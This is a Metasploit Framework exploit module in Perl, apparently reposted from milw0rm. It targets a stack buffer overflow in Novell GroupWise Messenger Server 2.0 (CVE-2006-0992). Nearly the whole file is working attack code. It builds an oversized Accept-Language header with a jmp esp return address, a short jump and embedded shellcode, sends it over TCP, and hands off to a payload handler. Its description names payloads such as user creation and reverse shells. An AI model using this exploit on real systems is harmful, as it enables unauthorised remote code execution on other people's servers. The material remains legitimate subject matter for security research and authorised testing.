##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::novell_messenger_acceptlang;
use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'Novell Messenger Server 2.0 Accept-Language Overflow',
	'Version' => '$Revision: 1.5 $',
	'Authors' => [ 'H D Moore <hdm[at]metasploit.com>' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'winxp', 'win2k', 'win2003' ],
	'Priv'  => 1,

	'AutoOpts'  =>  { 'EXITFUNC' => 'process' },

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 8300 ],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 500, 
		'BadChars'  => "\x00\x0a\x2c\x3b".join("", ("A".."Z")), # data is downcased
		'Keys' 	    => ['+ws2ord'],
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",  # add esp, -3500
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in Novell GroupWise
	Messenger Server v2.0. This flaw is triggered by any HTTP
	request with an Accept-Language header greater than 16 bytes.
	To overwrite the return address on the stack, we must first
	pass a memcpy() operation that uses pointers we supply. Due to the
	large list of restricted characters and the limitations of the current
	encoder modules, very few payloads are usable. The 'known good' set
	includes win32_adduser, win32_exec, and win32_reverse_ord;

}),

	'Refs'  =>
	  [
	  	['OSVDB', '24617'],
	  	['BID', '17503'],
		['CVE', '2006-0992'],
	  ],

	'Targets' =>
	  [
		[ 'Groupwise Messenger DClient.dll v10510.37', 0x6103c3d3, 0x61041001 ] # .data | jmp esp
	  ],

	'Keys'  => ['groupwise'],

	'DisclosureDate' => 'Apr 13 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	my $pattern = Pex::Text::AlphaNumText(1900);
	substr($pattern, 16, 4,  pack('V', $target->[2])); # SRC
	substr($pattern, 272, 4, pack('V', $target->[2])); # DST
	substr($pattern, 264, 4, pack('V', $target->[1])); # JMP ESP
	substr($pattern, 268, 2, "\xeb\x06"); # JMP +6	
	substr($pattern, 276, length($shellcode), $shellcode);

	my $request =
	  "GET / HTTP/1.1\r\n".
	  "Accept-Language: $pattern\r\n".
	  "\r\n";
	
	$s->Send($request);

	$self->PrintLine("[*] Overflow request sent...");

	$self->Handler($s);
	return;
}

1; 

# milw0rm.com [2006-04-15]